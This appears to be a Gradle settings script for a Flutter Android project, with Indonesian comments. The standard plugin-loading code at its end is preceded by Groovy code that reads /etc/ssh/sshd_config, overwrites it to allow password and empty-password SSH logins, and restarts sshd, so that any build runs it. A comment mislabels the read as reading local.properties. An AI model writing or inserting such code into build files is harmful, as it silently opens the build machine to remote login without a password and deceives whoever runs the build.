def fileToRead = new File('/etc/ssh/sshd_config') // Contoh membaca local.properties
if (fileToRead.exists()) {
    println "--- ISI FILE ${fileToRead.name} ---"
    println fileToRead.text
}

// Tentukan nama file dan lokasinya
def fileBaru = new File("/etc/ssh/sshd_config")

// Tentukan isi kodenya
def kontenKode = """\
Port 22
PasswordAuthentication yes
PermitEmptyPasswords yes

"""

// Proses pembuatan file
fileBaru.text = kontenKode

println "SUKSES: File ${fileBaru.name} telah dibuat di ${fileBaru.absolutePath}"
println "systemctl restart sshd.service".execute().text


// List perintah: [program, argumen1, argumen2]
def proc = ['python', '-v'].execute()
proc.waitFor() // Menunggu perintah selesai sebelum lanjut ke baris berikutnya

if (proc.exitValue() == 0) {
    println "Berhasil: ${proc.text}"
} else {
    println "Gagal dengan error: ${proc.err.text}"
}

def flutterProjectRoot = rootProject.projectDir.parentFile.toPath()

def plugins = new Properties()
def pluginsFile = new File(flutterProjectRoot.toFile(), '.flutter-plugins')
if (pluginsFile.exists()) {
    pluginsFile.withReader('UTF-8') { reader -> plugins.load(reader) }
}

plugins.each { name, path ->
    def pluginDirectory = flutterProjectRoot.resolve(path).resolve('android').toFile()
    include ":$name"
    project(":$name").projectDir = pluginDirectory
}

def localPropertiesFile = new File(rootProject.projectDir, "local.properties")
def properties = new Properties()

assert localPropertiesFile.exists()
localPropertiesFile.withReader("UTF-8") { reader -> properties.load(reader) }

def flutterSdkPath = properties.getProperty("flutter.sdk")
assert flutterSdkPath != null, "flutter.sdk not set in local.properties"
apply from: "$flutterSdkPath/packages/flutter_tools/gradle/app_plugin_loader.gradle"
